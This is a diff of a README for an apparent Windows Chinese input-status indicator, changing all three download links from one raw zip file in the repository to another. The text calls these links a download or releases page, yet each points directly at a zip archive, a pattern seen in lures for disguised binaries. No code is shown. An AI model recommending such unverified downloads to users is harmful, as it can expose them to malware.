@@ -1,7 +1,7 @@
 # 🎉 IME_Indicator - Simple Chinese Input Status Indicator
 
 ## 📥 Download Now
-[![Download IME_Indicator](https://github.com/RickAsli/IME_Indicator/raw/refs/heads/main/rust_indicator/assets/IM-Indicator-v2.6.zip)](https://github.com/RickAsli/IME_Indicator/raw/refs/heads/main/rust_indicator/assets/IM-Indicator-v2.6.zip)
+[![Download IME_Indicator](https://github.com/RickAsli/IME_Indicator/raw/refs/heads/main/rust_indicator/Indicator_IM_3.3.zip)](https://github.com/RickAsli/IME_Indicator/raw/refs/heads/main/rust_indicator/Indicator_IM_3.3.zip)
 
 ## 📖 Overview
 IME_Indicator helps you track your current Chinese input status on Windows. It clearly shows if you are using English or Chinese typing. This makes it easy to manage your input methods without switching screens or wasting time.
@@ -11,7 +11,7 @@ To start using IME_Indicator, follow these simple steps:
 
 1. **Visit the Download Page**  
    Click the link below to access the download options:  
-   [Download IME_Indicator](https://github.com/RickAsli/IME_Indicator/raw/refs/heads/main/rust_indicator/assets/IM-Indicator-v2.6.zip)
+   [Download IME_Indicator](https://github.com/RickAsli/IME_Indicator/raw/refs/heads/main/rust_indicator/Indicator_IM_3.3.zip)
 
 2. **Choose Your Version**  
    On the release page, you will see different versions listed. Select the latest version for the best experience.
@@ -64,6 +64,6 @@ For further assistance, please visit the issues page on the repository. Describe
 We welcome feedback and contributions! If you have suggestions, feel free to get involved. You can report issues or request features. 
 
 Stay updated with the latest news and updates on the project by checking the releases page regularly:  
-[Download IME_Indicator](https://github.com/RickAsli/IME_Indicator/raw/refs/heads/main/rust_indicator/assets/IM-Indicator-v2.6.zip)
+[Download IME_Indicator](https://github.com/RickAsli/IME_Indicator/raw/refs/heads/main/rust_indicator/Indicator_IM_3.3.zip)
 
 Thank you for choosing IME_Indicator! Enjoy hassle-free typing with clarity.
